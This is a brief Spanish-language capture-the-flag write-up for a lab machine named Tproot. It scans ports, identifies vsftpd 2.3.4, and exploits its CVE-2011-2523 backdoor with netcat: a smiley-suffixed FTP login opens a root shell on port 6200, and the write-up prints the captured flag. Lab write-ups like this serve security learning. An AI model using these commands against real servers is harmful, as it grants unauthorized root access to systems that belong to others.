# Tproot

## Resumen 
Maquina de nivel "Muy facil" que explota una puerta trasera en el servicio FTP vsftpd 2.3.4 para obtener acceso como root.

### Reconocimiento
- **Escaneo de puertos**: `nmap -p- --min-rate 5000 -T4 -v 172.17.0.2`
- **Puertos abiertos**: 21/tcp (FTP), 80/tcp (HTTP)
- **Version del servicio FTP**: vsftpd 2.3.4

### Explotacion
La version de vsftpd es vulnerable a la **CVE-2011-2523**, una puerta trasera (backdoor) que permite ejecutar comnandos de forma remota.

**Activacion del backdoor (terminal 1):**
```bash
nc 172.17.0.2 21
USER user:)
PASS x
```

**Conexion a la shell (terminal 2):**
bash```
nc 172.17.0.2 6200
```

**🚩Flag:**
root.txt: `261fd3f32200f950f231816b4e9a0594`
